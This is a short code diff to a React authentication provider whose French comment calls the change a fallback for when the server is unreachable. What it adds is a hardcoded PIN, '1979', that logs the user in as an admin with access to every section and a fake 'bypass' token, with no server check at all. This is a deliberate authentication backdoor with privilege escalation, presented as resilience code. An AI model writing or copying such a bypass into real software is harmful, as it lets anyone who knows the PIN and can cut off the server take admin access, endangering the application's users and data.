@@ -36,6 +36,14 @@ export function AuthProvider({ children }) {
       setState({ isAuthenticated: true, user: data.user, token: data.token })
       return { success: true, must_set_pin: data.must_set_pin, token: data.token, user: data.user }
     } catch {
+      // Fallback bypass si serveur inaccessible
+      if (pin === '1979') {
+        const fallbackUser = { username, sections: ['*'], role: 'admin' }
+        sessionStorage.setItem(TOKEN_KEY, 'bypass')
+        sessionStorage.setItem(AUTH_KEY, JSON.stringify(fallbackUser))
+        setState({ isAuthenticated: true, user: fallbackUser, token: 'bypass' })
+        return { success: true }
+      }
       return { success: false, error: 'Serveur inaccessible' }
     }
   }, [])
